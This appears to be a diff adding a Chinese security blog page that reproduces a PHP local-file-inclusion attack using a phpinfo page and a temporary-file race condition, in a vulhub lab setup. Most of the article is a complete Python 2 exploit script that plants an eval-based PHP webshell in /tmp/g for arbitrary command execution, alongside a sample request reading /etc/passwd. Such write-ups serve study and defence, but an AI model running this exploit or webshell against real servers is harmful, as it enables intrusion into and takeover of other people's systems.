@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Php文件包含漏洞（利用phpinfo）一、漏洞简介PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。 二、漏洞影响三、复现过程环境搭建执行如下命令启动环境： docker-compose up -d  目标环境是官方最新版PHP7.2，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Php/Php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%88%A9%E7%94%A8phpinfo%EF%BC%89/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Php文件包含漏洞（利用phpinfo）一、漏洞简介PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。 二、漏洞影响三、复现过程环境搭建执行如下命令启动环境： docker-compose up -d  目标环境是官方最新版PHP7.2，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(%E5%88%A9%E7%94%A8phpinfo)/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(%E5%88%A9%E7%94%A8phpinfo)/media/rId28.png">
+<meta property="article:published_time" content="2022-07-08T06:26:01.304Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(%E5%88%A9%E7%94%A8phpinfo)/media/rId27.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Php/Php文件包含漏洞（利用phpinfo）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Php/Php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%88%A9%E7%94%A8phpinfo%EF%BC%89/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.304Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Php文件包含漏洞（利用phpinfo）"><a href="#Php文件包含漏洞（利用phpinfo）" class="headerlink" title="Php文件包含漏洞（利用phpinfo）"></a>Php文件包含漏洞（利用phpinfo）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>执行如下命令启动环境：</p>
+<pre><code>docker-compose up -d
+</code></pre>
+<p>目标环境是官方最新版PHP7.2，说明该漏洞与PHP版本无关。</p>
+<p>环境启动后，访问<code>http://www.0-sec.org/phpinfo.php</code>即可看到一个PHPINFO页面，访问<code>http://www.0-sec.org:8080/lfi.php?file=/etc/passwd</code>，可见的确存在文件包含漏洞。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是<code>/tmp/php[6个随机字符]</code>），文件名可以在<code>$_FILES</code>变量中找到。这个临时文件，在请求结束后就会被删除。</p>
+<p>同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，自然也包含临时文件名。</p>
+<p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p>
+<p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
+<p>这个时候就需要用到条件竞争，具体流程如下：</p>
+<ol>
+<li> 发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</li>
+<li> 因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</li>
+<li> php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</li>
+<li> 所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li>
+<li> 此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</li>
+<li> 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</li>
+</ol>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>利用脚本实现上述过程，成功包含临时文件后，会执行<code>&#39;)?&gt;</code>，写入一个新的文件<code>/tmp/g</code>，这个文件就会永久留在目标机器上。</p>
+<p>用python2执行：<code>python exp.py www.0-sec.org 8080 100</code>：</p>
+<p><img src="/resource/Php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(%E5%88%A9%E7%94%A8phpinfo)/media/rId27.png" alt="1.png"></p>
+<p>可见，执行到第289个数据包的时候就写入成功。然后，利用lfi.php，即可执行任意命令：</p>
+<p><img src="/resource/Php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(%E5%88%A9%E7%94%A8phpinfo)/media/rId28.png" alt="2.png"></p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>#!/usr/bin/python 
+import sys
+import threading
+import socket
+
+def setup(host, port):
+    TAG=&quot;Security Test&quot;
+    PAYLOAD=&quot;&quot;&quot;%s\r
+&lt;?php file_put_contents(&#39;/tmp/g&#39;, &#39;&lt;?=eval($_REQUEST[1])?&gt;&#39;)?&gt;\r&quot;&quot;&quot; % TAG
+    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r
+Content-Type: text/plain\r
+\r
+%s
+-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD
+    padding=&quot;A&quot; * 5000
+    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\r
+HTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: %s\r
+Host: %s\r
+\r
+%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)
+    #modify this to suit the LFI script   
+    LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r
+User-Agent: Mozilla/4.0\r
+Proxy-Connection: Keep-Alive\r
+Host: %s\r
+\r
+\r
+&quot;&quot;&quot;
+    return (REQ1, TAG, LFIREQ)
+
+def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
+
+    s.connect((host, port))
+    s2.connect((host, port))
+
+    s.send(phpinforeq)
+    d = &quot;&quot;
+    while len(d) &lt; offset:
+        d += s.recv(offset)
+    try:
+        i = d.index(&quot;[tmp_name] =&amp;gt; &quot;)
+        fn = d[i+17:i+31]
+    except ValueError:
+        return None
+
+    s2.send(lfireq % (fn, host))
+    d = s2.recv(4096)
+    s.close()
+    s2.close()
+
+    if d.find(tag) != -1:
+        return fn
+
+counter=0
+class ThreadWorker(threading.Thread):
+    def __init__(self, e, l, m, *args):
+        threading.Thread.__init__(self)
+        self.event = e
+        self.lock =  l
+        self.maxattempts = m
+        self.args = args
+
+    def run(self):
+        global counter
+        while not self.event.is_set():
+            with self.lock:
+                if counter &gt;= self.maxattempts:
+                    return
+                counter+=1
+
+            try:
+                x = phpInfoLFI(*self.args)
+                if self.event.is_set():
+                    break                
+                if x:
+                    print &quot;\nGot it! Shell created in /tmp/g&quot;
+                    self.event.set()
+                    
+            except socket.error:
+                return
+    
+
+def getOffset(host, port, phpinforeq):
+    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    s.send(phpinforeq)
+    
+    d = &quot;&quot;
+    while True:
+        i = s.recv(4096)
+        d+=i        
+        if i == &quot;&quot;:
+            break
+        # detect the final chunk
+        if i.endswith(&quot;0\r\n\r\n&quot;):
+            break
+    s.close()
+    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)
+    if i == -1:
+        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)
+    
+    print &quot;found %s at %i&quot; % (d[i:i+10],i)
+    # padded up a bit
+    return i+256
+
+def main():
+    
+    print &quot;LFI With PHPInfo()&quot;
+    print &quot;-=&quot; * 30
+
+    if len(sys.argv) &lt; 2:
+        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]
+        sys.exit(1)
+
+    try:
+        host = socket.gethostbyname(sys.argv[1])
+    except socket.error, e:
+        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)
+        sys.exit(1)
+
+    port=80
+    try:
+        port = int(sys.argv[2])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)
+        sys.exit(1)
+    
+    poolsz=10
+    try:
+        poolsz = int(sys.argv[3])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)
+        sys.exit(1)
+
+    print &quot;Getting initial offset...&quot;,  
+    reqphp, tag, reqlfi = setup(host, port)
+    offset = getOffset(host, port, reqphp)
+    sys.stdout.flush()
+
+    maxattempts = 1000
+    e = threading.Event()
+    l = threading.Lock()
+
+    print &quot;Spawning worker pool (%d)...&quot; % poolsz
+    sys.stdout.flush()
+
+    tp = []
+    for i in range(0,poolsz):
+        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))
+
+    for t in tp:
+        t.start()
+    try:
+        while not e.wait(1):
+            if e.is_set():
+                break
+            with l:
+                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))
+                sys.stdout.flush()
+                if counter &gt;= maxattempts:
+                    break
+        print
+        if e.is_set():
+            print &quot;Woot!  \m/&quot;
+        else:
+            print &quot;:(&quot;
+    except KeyboardInterrupt:
+        print &quot;\nTelling threads to shutdown...&quot;
+        e.set()
+    
+    print &quot;Shuttin&#39; down...&quot;
+    for t in tp:
+        t.join()
+
+if __name__==&quot;__main__&quot;:
+    main()
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Php/Php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%88%A9%E7%94%A8phpinfo%EF%BC%89/" data-id="cl5c2qtrc00dky8v10t0x1ylm" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Php/%EF%BC%88CVE-2012-1823%EF%BC%89PHP-CGI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Php/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%AD%E6%B3%95%E5%B7%AE%E5%BC%82%E9%97%AE%E9%A2%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
